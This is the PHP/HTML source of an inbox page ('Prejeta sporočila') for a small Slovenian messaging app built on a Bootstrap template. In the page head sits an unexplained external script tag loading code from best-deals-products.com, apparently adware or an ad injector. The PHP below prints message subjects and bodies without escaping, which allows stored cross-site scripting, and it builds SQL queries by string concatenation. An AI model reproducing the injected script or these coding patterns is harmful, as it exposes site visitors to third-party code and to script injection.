<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Narrow Jumbotron Template for Bootstrap</title>

    <!-- Bootstrap core CSS -->
    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">
    <style type="text/css">
/* Space out content a bit */
body {
  padding-top: 20px;
  padding-bottom: 20px;
}

/* Everything but the jumbotron gets side spacing for mobile first views */
.header,
.marketing,
.footer {
  padding-right: 15px;
  padding-left: 15px;
}

/* Custom page header */
.header {
  padding-bottom: 20px;
  border-bottom: 1px solid #e5e5e5;
}
/* Make the masthead heading the same height as the navigation */
.header h3 {
  margin-top: 0;
  margin-bottom: 0;
  line-height: 40px;
}

/* Custom page footer */
.footer {
  padding-top: 19px;
  color: #777;
  border-top: 1px solid #e5e5e5;
}

/* Customize container */
@media (min-width: 768px) {
  .container {
    max-width: 730px;
  }
}
.container-narrow > hr {
  margin: 30px 0;
}

/* Main marketing message and sign up button */
.jumbotron {
  text-align: center;
  border-bottom: 1px solid #e5e5e5;
}
.jumbotron .btn {
  padding: 14px 24px;
  font-size: 21px;
}

/* Supporting marketing content */
.marketing {
  margin: 40px 0;
}
.marketing p + h4 {
  margin-top: 28px;
}

/* Responsive: Portrait tablets and up */
@media screen and (min-width: 768px) {
  /* Remove the padding we set earlier */
  .header,
  .marketing,
  .footer {
    padding-right: 0;
    padding-left: 0;
  }
  /* Space out the masthead */
  .header {
    margin-bottom: 30px;
  }
  /* Remove the bottom border on the jumbotron for visual effect */
  .jumbotron {
    border-bottom: 0;
  }
}
    </style>

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>

    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation"><a href="skupine.php">Ustvari skupino</a></li>            
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Prejeta sporočila</h3>
		<h4 class="text-muted"><?php session_start(); echo $_SESSION['ime'].' '. $_SESSION['priimek']; ?></h4>
      </div>

      <div class="jumbotron">

        <?php
        include "povezava.php";
        $osnutek = "";
        $id = $_SESSION['id']; //da vids ker uporabnik je prjavljen
        $sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.sender where t.reciever ='$id'";
        $sqlvsebina = "select t.zadeva, t.vsebina, t.id_transakcije, t.cas, t.prebrano from transakcija t where t.reciever='$id'";
        $recieverrez = mysqli_query($con, $sqlreciever);
        $vsebinarez = mysqli_query($con, $sqlvsebina);
        while($reciever = mysqli_fetch_row($recieverrez)){
          $vsebina = mysqli_fetch_row($vsebinarez);
          $words = split(" ", $vsebina[1]);
          for ($i = 0; ($i < 5 && $i < count($words)); $i++) {
          $osnutek .= $words[$i] . " ";
          }
          if($vsebina[4]==0)
          {
            echo 'NEPREBRANO<a href="sporocilo1.php?id=' . $vsebina[2] .'" class="list-group-item">' . $reciever[0] . ' ' . $reciever[1] . ' <strong>' . $vsebina[0] . '</strong> - ' . $osnutek . ' ' .  $vsebina[3] . '</a>';
            $osnutek = "";
          }
          else
          {
            echo 'PREBRANO<a href="sporocilo1.php?id=' . $vsebina[2] .'" class="list-group-item">' . $reciever[0] . ' ' . $reciever[1] . ' <strong>' . $vsebina[0] . '</strong> - ' . $osnutek . ' ' .  $vsebina[3] . '</a>';
            $osnutek = "";          
          }
        }
        ?>
      </div>
      <div class="row marketing">
        <div class="col-lg-6">
          Fantastična dva
    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
